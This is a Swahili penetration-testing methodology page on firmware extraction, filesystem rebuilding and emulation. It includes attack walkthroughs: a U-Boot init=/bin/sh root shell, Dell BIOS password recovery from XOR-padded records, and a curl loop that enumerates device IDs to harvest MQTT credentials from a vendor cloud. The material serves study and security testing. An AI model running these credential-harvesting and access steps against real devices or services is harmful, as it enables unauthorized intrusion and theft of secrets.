# Uchambuzi wa Firmware

{{#include ../../banners/hacktricks-training.md}}

{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/dds-rtps-security.md
{{#endref}}

## **Utangulizi**

### Rasilimali zinazohusiana

{{#ref}}
uefi-ifr-nvram-security-setting-patching.md
{{#endref}}

{{#ref}}
synology-encrypted-archive-decryption.md
{{#endref}}

{{#ref}}
../../network-services-pentesting/32100-udp-pentesting-pppp-cs2-p2p-cameras.md
{{#endref}}

{{#ref}}
android-mediatek-secure-boot-bl2_ext-bypass-el3.md
{{#endref}}

{{#ref}}
mediatek-xflash-carbonara-da2-hash-bypass.md
{{#endref}}

Firmware ni programu muhimu inayowezesha vifaa kufanya kazi ipasavyo kwa kusimamia na kurahisisha mawasiliano kati ya vipengele vya hardware na programu ambazo watumiaji hutumia. Huhifadhiwa kwenye kumbukumbu ya kudumu, hivyo kifaa kinaweza kufikia maagizo muhimu tangu kinapowashwa, na hivyo kuanzisha mfumo wa uendeshaji. Kuchunguza na huenda kurekebisha firmware ni hatua muhimu katika kutambua udhaifu wa kiusalama.<sup>[[2]](#references)[[3]](#references)</sup>

## **Kukusanya Taarifa**

**Kukusanya taarifa** ni hatua muhimu ya awali katika kuelewa muundo wa kifaa na teknolojia kinazotumia. Mchakato huu unahusisha kukusanya data kuhusu:

- Usanifu wa CPU na mfumo wa uendeshaji unaoendesha
- Maelezo mahususi ya bootloader
- Mpangilio wa hardware na datasheet
- Vipimo vya codebase na mahali pa source code
- Maktaba za nje na aina za leseni
- Historia ya masasisho na vyeti vya udhibiti
- Michoro ya usanifu na mtiririko
- Tathmini za usalama na udhaifu uliotambuliwa

Kwa madhumuni haya, zana za **open-source intelligence (OSINT)** ni muhimu sana, pamoja na uchanganuzi wa vipengele vyovyote vya open-source software vinavyopatikana kupitia michakato ya ukaguzi wa mikono na kiotomatiki. Zana kama [Coverity Scan](https://scan.coverity.com) na [Semmle’s LGTM](https://lgtm.com/#explore) hutoa static analysis ya bila malipo inayoweza kutumiwa kutafuta matatizo yanayoweza kuwepo.

## **Kupata Firmware**

Firmware inaweza kupatikana kwa njia mbalimbali, kila moja ikiwa na kiwango chake cha ugumu:

- **Moja kwa moja** kutoka kwa chanzo (watengenezaji, wazalishaji)
- **Kuijenga** kwa kutumia maelekezo yaliyotolewa
- **Kuipakua** kutoka kwenye tovuti rasmi za usaidizi
- Kutumia hoja za **Google dork** kutafuta faili za firmware zilizowekwa mtandaoni
- Kufikia **cloud storage** moja kwa moja, kwa kutumia zana kama [S3Scanner](https://github.com/sa7mon/S3Scanner)
- Kuingilia **masasisho** kwa kutumia mbinu za man-in-the-middle
- **Kuitoa** kutoka kwenye kifaa kupitia miunganisho kama **UART**, **JTAG**, au **PICit**
- **Kusikiliza** maombi ya masasisho ndani ya mawasiliano ya kifaa
- Kutambua na kutumia **hardcoded update endpoints**
- **Kudump** kutoka kwenye bootloader au mtandao
- **Kuondoa na kusoma** chipu ya hifadhi, njia nyingine zote zinaposhindikana, kwa kutumia zana zinazofaa za hardware

### Logs za UART pekee: lazimisha root shell kupitia mazingira ya U-Boot kwenye flash

Ikiwa UART RX hupuuzwa (logs pekee), bado unaweza kulazimisha init shell kwa **kuhariri blob ya mazingira ya U-Boot** ukiwa nje ya kifaa:<sup>[[6]](#references)</sup>

1. Dump SPI flash kwa kutumia klipu ya SOIC-8 na programmer (3.3V):
   ```bash
   flashrom -p ch341a_spi -r flash.bin
   ```
2. Tafuta partition ya U-Boot env, hariri `bootargs` ili kujumuisha `init=/bin/sh`, na **hesabu upya CRC32 ya U-Boot env** ya blob.
3. Flash upya partition ya env pekee kisha washa upya; shell inapaswa kuonekana kwenye UART.

Hii ni muhimu kwenye vifaa vilivyopachikwa ambapo shell ya bootloader imezimwa lakini partition ya env inaweza kuandikwa kupitia ufikiaji wa flash ya nje.

## Kuchambua firmware

Sasa kwa kuwa **una firmware**, unahitaji kutoa taarifa kuihusu ili kujua jinsi ya kuishughulikia. Kuna zana tofauti unazoweza kutumia kwa hilo:

```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #print offsets in hex
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head # might find signatures in header
fdisk -lu <bin> #lists a drives partition and filesystems if multiple
```

Ukipata taarifa chache kwa kutumia zana hizo, angalia **entropy** ya image kwa `binwalk -E <bin>`; ikiwa entropy ni ndogo, huenda haijasimbwa kwa njia fiche. Ikiwa entropy ni kubwa, huenda imesimbwa kwa njia fiche (au imebanwa kwa namna fulani).

Pia, unaweza kutumia zana hizi kutoa **files zilizopachikwa ndani ya firmware**:


{{#ref}}
../../generic-methodologies-and-resources/basic-forensic-methodology/partitions-file-systems-carving/file-data-carving-recovery-tools.md
{{#endref}}

Au [**binvis.io**](https://binvis.io/#/) ([code](https://code.google.com/archive/p/binvis/)) kukagua file.

### Uchambuzi linganishi wa flash na hifadhi za siri za XOR zinazoweza kurejeshwa

Ikiwa format ya hifadhi ya setting ya firmware haijaandikwa kwenye nyaraka, kwanza soma flash inayolingana mara kadhaa, badilisha setting **moja tu**, hifadhi dump ya chip nzima tena, kisha linganisha offsets. Kurudia jaribio kwa kutumia thamani zinazodhibitiwa hutofautisha setting na counters pamoja na metadata ya uandishi; mabadiliko kwenye offsets mpya badala ya sehemu zilezile yanaashiria hifadhi ya append-only au log-structured. Hifadhi entries zilizofutwa/zinazoashiria kufutwa, kwani bytes za payload zake huenda bado zikarejeshwa.<sup>[[12]](#references)[[13]](#references)</sup>

```bash
sha256sum baseline-1.bin baseline-2.bin baseline-3.bin
cmp -l baseline-1.bin changed.bin
```

Baada ya kupata eneo hilo, toa moduli za firmware kwa kutumia zana kama `binwalk`, kisha fanya reverse engineering ya writer/validator katika Ghidra. Thibitisha mipaka ya sehemu, padding, uorodheshaji wa key na uundaji wa key kwenye code, badala ya kukisia scheme kwa kutegemea tu mifumo ya ciphertext.<sup>[[12]](#references)</sup>

#### Rejesha keys kutoka kwenye zero padding iliyosimbwa kwa njia fiche

Kama ilivyoelezwa katika [XOR-based encryption](../../crypto/symmetric/#xor-based-encryption), plaintext inayojulikana hufichua byte za keystream katika offsets zilezile. Sehemu yenye ukubwa usiobadilika huwa hatarini hasa wakati zero padding yake inapofunika kila index ya key ya XOR inayojirudia: padding iliyosimbwa hufichua byte hizo za key moja kwa moja kwa sababu `0x00 XOR key_byte = key_byte`. Ikiwa kila index ya key imefunikwa, jenga upya key kutoka kwenye mwisho wa ciphertext na usimbue byte zilizo na data.<sup>[[12]](#references)</sup>

Muundo wa DVAR wa nenosiri la BIOS wa Dell ulio hatarini ni mfano halisi: byte `0` ya sehemu yenye byte 32 iko katika plaintext, huku byte `1..31` zikitumia key ya byte 20 inayojirudia.<sup>[[12]](#references)</sup>

```text
stored[0] = password[0]
stored[i] = password[i] XOR key[(i - 1) mod 20]  # i = 1..31
```

Kwa urefu wa password `L`, nafasi `L..31` zilikuwa sifuri kabla ya XOR. Wakati `L <= 12`, nafasi hizo zinajumuisha kila index ya key, hivyo key na password kamili zinapatikana bila brute force:<sup>[[12]](#references)</sup>

```text
key[(i - 1) mod 20] = stored[i]                  # padding positions
password[i] = stored[i] XOR key[(i - 1) mod 20] # populated positions
```

#### Pata funguo kutoka kwenye rekodi za kihistoria

Usichanganue kila rekodi kivyake. Ufunguo wa DVAR hukokotolewa takribani kama `modified_md5(device_seed || variable_GUID || password[0])`: seed ya kifaa na GUID hazibadiliki, na ingizo pekee linalotegemea nenosiri ni baiti ya kwanza iliyo wazi. Hivyo, kuna funguo zisizozidi 256 kwa kila kifaa, na rekodi zinazoanza kwa baiti moja hushiriki ufunguo. Panga rekodi zinazotumika na zilizofutwa kulingana na baiti hiyo; rekodi fupi ya zamani inaweza kufichua ufunguo kamili kupitia padding na kusimbua rekodi mpya ndefu ambayo padding yake pekee haitoshi. Kwa hivyo, kubadilisha nenosiri kunaweza kuongeza hatari ya kufichuliwa pale ciphertext ya zamani inapowekwa alama ya kufutwa badala ya kufutwa kabisa.<sup>[[12]](#references)</sup>

Zana ya [`dellpwn`](https://github.com/R3n5k1/dellpwn) hupata DVAR, huthibitisha rekodi zinazowezekana, hurejesha manenosiri, na inaweza kuonyesha baiti ghafi zilizohifadhiwa/za ufunguo. Iunde kutoka kwenye checkout na uchanganue image ya flash iliyothibitishwa kama ifuatavyo:<sup>[[13]](#references)</sup>

```bash
cargo install --path .
dellpwn scan dump.bin --raw
dellpwn scan dump.bin --partial  # include uncertain recoveries
```

Kwa custom parsers, kataa false positives kwa kutumia muundo wa rekodi, masharti ya herufi zinazoweza kuchapishwa, ukaguzi wa zero-padding, key entropy, na uthabiti pale key inapozunguka. Ikiwa dumps zinazorudiwa zinaonyesha bit flips chache kwa kila write, orodhesha masks zilizozingatiwa na upange corrections kwa kutumia masharti haya, lakini ripoti herufi zisizo na uhakika badala ya kuwasilisha matokeo ya heuristic kana kwamba ni urejeshaji sahihi.<sup>[[12]](#references)</sup>

Password verifiers zinapaswa kuhifadhi salted, iterated one-way hash badala ya ciphertext inayoweza kurejeshwa, na log-structured stores zinapaswa kuondoa kwa usalama secret material iliyopitwa na wakati.<sup>[[12]](#references)</sup>

### Kupata Filesystem

Kwa tools zilizotajwa awali, kama `binwalk -ev <bin>`, ulipaswa kuwa umeweza **kutoa filesystem**.\
Binwalk kwa kawaida huitoa ndani ya **folder iliyopewa jina la aina ya filesystem**, ambayo kwa kawaida huwa mojawapo ya hizi: squashfs, ubifs, romfs, rootfs, jffs2, yaffs2, cramfs, initramfs.

#### Kutoa Filesystem kwa Mikono

Wakati mwingine, binwalk **haitakuwa na magic byte ya filesystem kwenye signatures zake**. Katika hali hizi, tumia binwalk **kutafuta offset ya filesystem na kuchonga filesystem iliyobanwa** kutoka kwenye binary, kisha **utoe filesystem kwa mikono** kulingana na aina yake kwa kutumia hatua zilizo hapa chini.

```
$ binwalk DIR850L_REVB.bin

DECIMAL HEXADECIMAL DESCRIPTION
----------------------------------------------------------------------------- ---

0 0x0 DLOB firmware header, boot partition: """"dev=/dev/mtdblock/1""""
10380 0x288C LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: 5213748 bytes
1704052 0x1A0074 PackImg section delimiter tag, little endian size: 32256 bytes; big endian size: 8257536 bytes
1704084 0x1A0094 Squashfs filesystem, little endian, version 4.0, compression:lzma, size: 8256900 bytes, 2688 inodes, blocksize: 131072 bytes, created: 2016-07-12 02:28:41
```

Tekeleza **dd command** ifuatayo ili kufanya carving ya Squashfs filesystem.

```
$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs

8257536+0 records in

8257536+0 records out

8257536 bytes (8.3 MB, 7.9 MiB) copied, 12.5777 s, 657 kB/s
```

Vinginevyo, amri ifuatayo pia inaweza kutekelezwa.

`$ dd if=DIR850L_REVB.bin bs=1 skip=$((0x1A0094)) of=dir.squashfs`

- Kwa squashfs (iliyotumika kwenye mfano hapo juu)

`$ unsquashfs dir.squashfs`

Baadaye, faili zitakuwa kwenye saraka ya "`squashfs-root`".

- Faili za kumbukumbu za CPIO

`$ cpio -ivd --no-absolute-filenames -F <bin>`

- Kwa mifumo ya faili ya jffs2

`$ jefferson rootfsfile.jffs2`

- Kwa mifumo ya faili ya ubifs yenye flash ya NAND

`$ ubireader_extract_images -u UBI -s <start_offset> <bin>`

`$ ubidump.py <bin>`

### Kujenga upya mifumo ya faili ya root iliyopachikwa na kugawanywa

Ikiwa dump ghafi ya eMMC/SSD ina kichwa halali cha mfumo wa faili lakini offsets za metadata yake zinaenea nje ya partition iliyobainishwa, usiihitimishe mara moja kuwa imeharibika. Msimbo wa boot uliopachikwa unaweza kuunda kifaa halisi cha root kutoka kwenye safu nyingi za kimwili kwa kutumia Device Mapper, kwa hiyo kuchukua data kutoka GPT partition moja kunatoa segmenti ya kwanza pekee.<sup>[[9]](#references)</sup>

#### Tathmini picha nzima ya media

Kwanza thibitisha kuwa upataji wa data umekamilika, ukubwa ni thabiti, na hakuna mchakato wa kuandika bado unaoshikilia picha hiyo. Ikiwa jina la faili linaonyesha anwani ya mwanzo/mwisho, linganisha masafa hayo na idadi halisi ya byte. Rejesha GPT katika hali ya kusoma pekee na uambatishe masafa yanayohitajika tu; **usiendeshe** `vgchange -ay` dhidi ya volume halisi isiyoaminika kwenye workstation, kwa sababu migongano ya volume-group na uandishi usiokusudiwa vinaweza kutokea.<sup>[[9]](#references)</sup>

```bash
stat -c '%s bytes' firmware.bin
lsof -- firmware.bin
fdisk -l firmware.bin
parted firmware.bin unit B print

# Inspect one partition without copying it
sudo losetup --find --show --read-only \
  --offset "$PART_OFF" --sizelimit "$PART_LEN" firmware.bin
```

Tumia VM inayoweza kutupwa ikiwa logic ya awali ya init au stack ya LVM inahitaji kuona image nzima. Logi za kihistoria za boot kutoka kwenye partition ya kawaida ya boot zina manufaa hasa: bootloader huenda ilihifadhi kwenye logi offsets za proprietary-container, urefu wa vipengele, uteuzi wa slot, kanuni za alignment na uthibitishaji wa signature. Tumia thamani hizo kutenganisha command line/kernel/initramfs iliyopachikwa, kisha uthibitishe kila matokeo kivyake kwa kutumia `file`, magic bytes na `binwalk`; kusoma hadi mwisho wa container kunaweza kuongeza initrd, ACPI object au signature kwenye kernel bila kukusudia.<sup>[[9]](#references)</sup>

#### Rejesha ramani ya block ya wakati wa boot

Toa initramfs ya kernel na ufanye reverse engineering ya `/init` yake pamoja na library zozote za storage. Katika [Reversing Tools & Basic Methods](../../reversing/reversing-tools-basic-methods/), fuatilia marejeleo ya strings za `/proc/cmdline`, `/dev/mapper/`, `dmsetup`, `BLKGETSIZE64` na njia za partition; kisha fuatilia code inayochagua slot hai ya A/B na kuunda table. Sehemu nzuri za kuanzia katika radare2 ni `r2 -A init`, `afl`, `pdf @ main` na `pdf @ fcn.xxxxx`.<sup>[[9]](#references)</sup>

Lengo la linear huweka ranges zinazofuatana za kifaa pepe kwenye ranges za kifaa kimoja au zaidi vya msingi. Table ya sehemu mbili iliyorejeshwa kwa kawaida huwa na umbo hili (nafasi na urefu wote ni kwa sekta za byte 512):<sup>[[9]](#references)[[10]](#references)</sup>

```text
0              <seg1_sectors> linear /dev/mmcblk0p2 0
<seg1_sectors> <seg2_sectors> linear /dev/mmcblk0p4 <tail_start>
```

Rudia hesabu za machine-code kama zilivyo hasa, ikijumuisha upana wa integer, shifts na ubadilishaji wa vipimo. Kwa mfano, usemi ufuatao huzungusha ukubwa wa byte chini hadi kwenye mpaka wa 4-KiB, kisha tu huubadilisha kuwa sekta za 512-byte; kuubadilisha na `p4_bytes // 512` husogeza sehemu ya mwisho iliyochaguliwa kwa `p4_bytes % 4096` wakati wowote partition haijapangiliwa kwenye mpaka wa ukurasa.<sup>[[9]](#references)</sup>

```python
p4_sectors = (p4_bytes >> 12) << 3
effective_bytes = p4_sectors * 512
tail_start = effective_bytes - tail_distance
```

Unda upya taswira tambarare ya uchanganuzi kwa kunakili vipande kwa mpangilio wa jedwali, ukitumia mafungu yenye ukubwa unaodhibitiwa badala ya kupakia dump kamili ya media kwenye kumbukumbu. Hii pia huepusha kuunda vifaa vya mapper upande wa host. Weka offsets zilizotokana na GPT, hesabu za sekta zilizogeuzwa, na urefu wa matokeo kama assertions tofauti.<sup>[[9]](#references)</sup>

#### Tofautisha uharibifu na hitilafu ya mara kwa mara ya ujenzi upya

Kwa SquashFS, angalia magic ya `hsqs` na usimbue sehemu ya `bytes_used` ya little-endian ya biti 64 kwenye offset 40 ya superblock kabla ya kutumia `unsquashfs`. Ikiwa uchimbaji unashindwa katika miundo kadhaa isiyohusiana, tafuta katika dirisha pana kuzunguka nafasi zinazotarajiwa na utake wagombeaji wenye miundo imara: metadata block inayoweza decompressed, maingizo kadhaa ya saraka halali yanayofuatana, sehemu zinazokubalika za inode, root inode inayolingana na idadi ya inode, au muundo halali wa integrity metadata. Kulingana na ulinganifu mmoja tu wa magic hakutoshi.<sup>[[9]](#references)</sup>

```python
import struct

with open("rootfs.img", "rb") as f:
    sb = f.read(96)
assert sb[:4] == b"hsqs"
bytes_used = struct.unpack_from("<Q", sb, 40)[0]
nominal_end = (bytes_used + 4095) & ~4095
print(hex(bytes_used), hex(nominal_end))
```

Wakati delta ileile yenye thamani hasi au chanya inafanya miundo huru kuwa halali—kwa mfano, metadata ya directory na rekodi ya verity—chanzo kinachowezekana ni kosa la kimfumo la mwanzo wa segment, wala si baiti zinazokosekana. Rudi kwenye hesabu iliyogeuzwa na utafute mabaki yaliyotupwa, signedness, overflow, au kuzungusha hadi sector/page kabla ya kujaribu kurejesha orphan au kurekebisha metadata ya filesystem.<sup>[[9]](#references)</sup>

Mwishowe, weka mipaka ya ulinzi kando: volume za LUKS zilizofungwa kwa TPM hulinda usiri wa data, ilhali mapping ya dm-verity iliyotiwa saini hulinda uadilifu wa root filesystem. TPM ya software haiwezi kurejesha ufunguo uliofungwa kwa TPM halisi ya awali, na kuwasha SquashFS iliyorekebishwa kupitia init ya matumizi ya utafiti pekee ambayo huacha uthibitishaji wa verity hakughushi sahihi yake wala hakuvunji dm-verity.<sup>[[9]](#references)</sup>

## Kuchanganua Firmware

Baada ya firmware kupatikana, ni muhimu kuichanganua kwa undani ili kuelewa muundo wake na udhaifu unaoweza kuwepo. Mchakato huu unahusisha kutumia zana mbalimbali kuchanganua na kutoa data muhimu kutoka kwenye picha ya firmware.

### Zana za Uchambuzi wa Awali

Seti ya amri imetolewa kwa ukaguzi wa awali wa faili ya binary (inayorejelewa kama `<bin>`). Amri hizi husaidia kutambua aina za faili, kutoa strings, kuchanganua data ya binary, na kuelewa maelezo ya partition na filesystem:

```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #prints offsets in hexadecimal
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head #useful for finding signatures in the header
fdisk -lu <bin> #lists partitions and filesystems, if there are multiple
```

Ili kutathmini hali ya usimbaji fiche ya image, hukaguliwa **entropia** kwa kutumia `binwalk -E <bin>`. Entropia ya chini huashiria ukosefu wa usimbaji fiche, huku entropia ya juu ikionyesha uwezekano wa usimbaji fiche au ukandamizaji.

Kwa kutoa **faili zilizopachikwa**, inapendekezwa kutumia zana na nyenzo kama nyaraka za **file-data-carving-recovery-tools** na **binvis.io** kwa ukaguzi wa faili.

### Kutoa Mfumo wa Faili

Kwa kutumia `binwalk -ev <bin>`, kwa kawaida unaweza kutoa mfumo wa faili, mara nyingi kwenye saraka iliyopewa jina la aina ya mfumo wa faili (kwa mfano, squashfs, ubifs). Hata hivyo, **binwalk** inaposhindwa kutambua aina ya mfumo wa faili kwa sababu byte za magic hazipo, ni lazima utoe mfumo huo wa faili mwenyewe. Hili hufanywa kwa kutumia `binwalk` kutafuta offset ya mfumo wa faili, kisha kutumia amri ya `dd` kuikata na kuitoa:

```bash
$ binwalk DIR850L_REVB.bin

$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs
```

Baadaye, kulingana na aina ya filesystem (kwa mfano, squashfs, cpio, jffs2, ubifs), hutumika amri tofauti ili kutoa maudhui kwa mikono.

### Uchanganuzi wa Filesystem

Baada ya kutoa filesystem, utafutaji wa dosari za usalama huanza. Huzingatiwa daemon za mtandao zisizo salama, credentials zilizowekwa moja kwa moja, API endpoints, utendaji wa seva za masasisho, code ambayo haijakusanywa, startup scripts, na binaries zilizokusanywa kwa ajili ya uchanganuzi wa offline.

**Maeneo muhimu** na **vipengee** vya kukagua ni pamoja na:

- **etc/shadow** na **etc/passwd** kwa ajili ya credentials za watumiaji
- Vyeti na keys za SSL katika **etc/ssl**
- Configuration na script files zinazoweza kuwa na udhaifu
- Embedded binaries kwa ajili ya uchanganuzi zaidi
- Web servers na binaries za kawaida za vifaa vya IoT

Zana kadhaa husaidia kufichua taarifa nyeti na udhaifu ndani ya filesystem:

- [**LinPEAS**](https://github.com/carlospolop/PEASS-ng) na [**Firmwalker**](https://github.com/craigz28/firmwalker) kwa ajili ya kutafuta taarifa nyeti
- [**The Firmware Analysis and Comparison Tool (FACT)**](https://github.com/fkie-cad/FACT_core) kwa ajili ya uchanganuzi wa kina wa firmware
- [**FwAnalyzer**](https://github.com/cruise-automation/fwanalyzer), [**ByteSweep**](https://gitlab.com/bytesweep/bytesweep), [**ByteSweep-go**](https://gitlab.com/bytesweep/bytesweep-go), na [**EMBA**](https://github.com/e-m-b-a/emba) kwa ajili ya uchanganuzi tuli na wa wakati wa utekelezaji

### Ukaguzi wa Usalama wa Binaries Zilizokusanywa

Msimbo chanzo na binaries zilizokusanywa zinazopatikana ndani ya filesystem lazima zikaguliwe kwa makini ili kubaini udhaifu. Zana kama **checksec.sh** kwa binaries za Unix na **PESecurity** kwa binaries za Windows husaidia kutambua binaries zisizo na ulinzi ambazo zinaweza kutumiwa vibaya.

## Kukusanya cloud config na credentials za MQTT kupitia URL tokens zilizotokana na taarifa nyingine

Vituo vingi vya IoT hupata configuration ya kila kifaa kutoka cloud endpoint inayofanana na hii:<sup>[[5]](#references)</sup>

- `https://<api-host>/pf/<deviceId>/<token>`

Wakati wa uchanganuzi wa firmware, unaweza kugundua kuwa `<token>` hutokana na device ID ya ndani kwa kutumia secret iliyowekwa moja kwa moja, kwa mfano:

- token = MD5( deviceId || STATIC_KEY ) na huwakilishwa kama hex ya herufi kubwa

Muundo huu humwezesha mtu yeyote anayejua deviceId na STATIC_KEY kuunda upya URL na kupata cloud config, ambayo mara nyingi hufichua credentials za MQTT zilizo wazi na viambishi awali vya topic.

Utaratibu wa vitendo:

1) Toa deviceId kutoka kwenye boot logs za UART

- Unganisha adapta ya UART ya 3.3V (TX/RX/GND) na unase logs:

```bash
picocom -b 115200 /dev/ttyUSB0
```

- Tafuta mistari inayochapisha muundo wa URL ya usanidi wa cloud na anwani ya broker, kwa mfano:

```
Online Config URL https://api.vendor.tld/pf/<deviceId>/<token>
MQTT: mqtt://mq-gw.vendor.tld:8001
```

2) Rejesha STATIC_KEY na algorithm ya token kutoka kwenye firmware

- Pakia binaries kwenye Ghidra/radare2 na utafute config path ("/pf/") au matumizi ya MD5.
- Thibitisha algorithm (mf., MD5(deviceId||STATIC_KEY)).
- Tengeneza token kwenye Bash na uweke digest kwa herufi kubwa:

```bash
DEVICE_ID="d88b00112233"
STATIC_KEY="cf50deadbeefcafebabe"
printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}'
```

3) Kusanya usanidi wa cloud na credentials za MQTT

- Unda URL na upakue JSON kwa curl; chambua kwa jq ili kutoa siri:

```bash
API_HOST="https://api.vendor.tld"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -sS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq .
# Fields often include: mqtt host/port, clientId, username, password, topic prefix (tpkfix)
```

4) Tumia vibaya MQTT ya plaintext na ACL dhaifu za topic (ikiwa zipo)

- Tumia credentials zilizopatikana ku-subscribe kwenye topics za matengenezo na kutafuta matukio nyeti:

```bash
mosquitto_sub -h <broker> -p <port> -V mqttv311 \
  -i <client_id> -u <username> -P <password> \
  -t "<topic_prefix>/<deviceId>/admin" -v
```

5) Orodhesha vitambulisho vya vifaa vinavyotabirika (kwa kiwango kikubwa, ukiwa na idhini)

- Mifumo mingi hujumuisha baiti za OUI/bidhaa/aina za vendor zikifuatiwa na kiambishi tamati kinachofuatana kwa mpangilio.
- Unaweza kujaribu vitambulisho vinavyowezekana, kupata tokens na kuchukua configs kwa njia ya programu:

```bash
API_HOST="https://api.vendor.tld"; STATIC_KEY="cf50deadbeef"; PREFIX="d88b1603" # OUI+type
for SUF in $(seq -w 000000 0000FF); do
  DEVICE_ID="${PREFIX}${SUF}"
  TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
  curl -fsS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq -r '.mqtt.username,.mqtt.password' | sed "/null/d" && echo "$DEVICE_ID"
done
```

Maelezo
- Pata idhini ya wazi kila mara kabla ya kujaribu kufanya enumeration kwa wingi.
- Inapowezekana, pendelea emulation au static analysis ili kurejesha siri bila kurekebisha hardware lengwa.

Mchakato wa ku-emulate firmware huwezesha **dynamic analysis** ya utendakazi wa kifaa au programu moja moja. Mbinu hii inaweza kukumbana na changamoto zinazohusiana na hardware au utegemezi wa usanifu, lakini kuhamisha root filesystem au binaries maalum hadi kwenye kifaa chenye usanifu na endianness inayolingana, kama Raspberry Pi, au kwenye mashine pepe iliyotengenezwa awali, kunaweza kurahisisha majaribio zaidi.

### Ku-emulate Binaries Binafsi

Unapochunguza programu moja moja, ni muhimu kubaini endianness na usanifu wa CPU wa programu hiyo.

#### Mfano wa Usanifu wa MIPS

Ili ku-emulate binary ya usanifu wa MIPS, unaweza kutumia amri:

```bash
file ./squashfs-root/bin/busybox
```

Na kusakinisha zana muhimu za uigaji:

```bash
sudo apt-get install qemu qemu-user qemu-user-static qemu-system-arm qemu-system-mips qemu-system-x86 qemu-utils
```

Kwa MIPS (big-endian), hutumika `qemu-mips`, na kwa binary za little-endian, chaguo litakuwa `qemu-mipsel`.

#### Uigaji wa ARM Architecture

Kwa binary za ARM, mchakato unafanana, huku emulator ya `qemu-arm` ikitumika kwa uigaji.

### Uigaji wa Mfumo Mzima

Zana kama [Firmadyne](https://github.com/firmadyne/firmadyne), [Firmware Analysis Toolkit](https://github.com/attify/firmware-analysis-toolkit), na nyinginezo, hurahisisha uigaji kamili wa firmware, hufanya mchakato huo kiotomatiki na kusaidia katika uchanganuzi wa nguvu.

### Kuunda upya root filesystem zilizogawanywa na kuthibitishwa kwa ajili ya uigaji

Ikiwa superblock ya SquashFS inasomeka lakini offsets za inode, directory, au jedwali la fragment haziwezekani, usiibadilishe `unsquashfs` mara moja. Reverse-engineer binary ya early boot na uzalishe upya grafu ya block-device inayoundwa nayo: mifumo iliyopachikwa inaweza kuonyesha partition ya root inayoonekana kuwa ya kawaida, lakini ikaunda mfumo halisi wa faili kwa kutumia mapping ya `dm-linear` inayoongeza sectors zilizokopwa kutoka partition nyingine. Ukaguzi wa superblock pekee unaweza kufanikiwa hata kama kila block ya metadata inayofuata imehamishwa.<sup>[[11]](#references)</sup>

Hifadhi hesabu za firmware jinsi zilivyo hasa. Hasa, bainisha kama urefu ni bytes, sectors za baiti 512, au kurasa za 4 KiB; zalisha upya shifts na truncation kwa mpangilio wake wa awali; na zingatia maeneo ya mwisho yanayotegemea bank katika mipangilio ya A/B. Kwa mfano, `(partition_bytes >> 12) << 3` kwanza hukata thamani hadi mpaka wa 4 KiB, kisha huibadilisha matokeo kuwa sectors za baiti 512; kuibadilisha na `partition_bytes // 512` kunaweza kusogeza extent iliyoongezwa kwa kilobyte chache na kuharibu majedwali yote ya SquashFS yanayofuata.<sup>[[11]](#references)</sup>

Mtiririko wa kazi unaofaa wa uthibitishaji ni:<sup>[[11]](#references)</sup>

1. Pata chanzo cha kifaa, start sector, na urefu wa kila segment ya `dm-linear` kutoka kwenye binary ya verifier/init.
2. Unganisha au map kila extent bila kubadilisha semantiki zake za alignment.
3. Ikiwa extraction bado inashindwa, tafuta katika eneo dogo tu karibu na mpaka uliotabiriwa, na udai kuwepo kwa miundo kadhaa halali ya metadata mfululizo badala ya kukubali superblock inayoonekana kuwa halali pekee.
4. Tumia `unsquashfs` isiyobadilishwa kwenye image iliyoundwa upya; kufanikiwa kupitia directories na fragments zote ni ushahidi imara zaidi kuliko `unsquashfs -stat`.

#### Kubadilisha dm-verity kwa udhibiti wa mchambuzi

Mchambuzi anapodhibiti kernel ya QEMU, initramfs, na diski pepe, root iliyorekebishwa inaweza kuwashwa kwa kubadilisha PID 1 ya uthibitishaji ya vendor na init ndogo iliyounganishwa statically. Huu ni **ubadilishaji wa boot-chain wa maabara**, si kuvunja dm-verity, sahihi yake ya RSA, Secure Boot, au ufunguo uliofungwa kwa TPM.<sup>[[11]](#references)</sup>

Init mbadala inapaswa kuiga sehemu za kiutendaji za boot path ya awali: mount `devtmpfs`, kuita `setsid()`, kuunganisha `/dev/console` na file descriptors 0–2, mount `/proc` na `/sys`, kusubiri block device iliyotolewa, mount root iliyohaririwa katika hali ya kusoma tu, detach pseudo-filesystems za old-root, kuhamisha mount mpya kwenda `/` kwa kutumia `MS_MOVE`, kutumia `chroot`, na kuendesha `execve()` ya `/sbin/init` ya awali ya firmware. Kudetach `/dev`, `/proc`, na `/sys` **kabla ya** `MS_MOVE` huzuia mount points za new root kudetachiwa kimakosa.<sup>[[11]](#references)</sup>

Weka hali ya kifaa inayoweza kubadilika kando na root isiyobadilika iliyorekebishwa. Overlay ya qcow2 inaweza kuhifadhi hali ya LVM ya diski ya awali huku diski ya pili ya virtio ya kusoma tu ikitoa SquashFS iliyohaririwa:<sup>[[11]](#references)</sup>

```bash
qemu-img create -f qcow2 -F raw -b emmc.raw overlay.qcow2
qemu-system-x86_64 ... -kernel bzImage -initrd custom-initramfs.cpio.gz \
  -drive if=none,id=emmc,format=qcow2,file=overlay.qcow2 \
  -device sdhci-pci -device sd-card,drive=emmc \
  -drive if=virtio,format=raw,readonly=on,file=rootfs-edited.squashfs
```

#### Utatuzi wa hitilafu za hali ya image ukiwa nje ya mtandao

Kagua hali endelevu nje ya guest wakati boot za polepole, startup scripts zinazoharibu data, au logging ya console isiyotegemewa zinaficha hitilafu. Usiambatishe overlay ambayo VM inayoendesha inaitumia; ifichue kwa `qemu-nbd`, zuia ugunduzi wa LVM kwenye partition ya NBD iliyokusudiwa, na uzime volume group kabla ya kuikata.<sup>[[11]](#references)</sup>

```bash
sudo modprobe nbd max_part=16
sudo qemu-nbd --connect=/dev/nbd0 overlay.qcow2
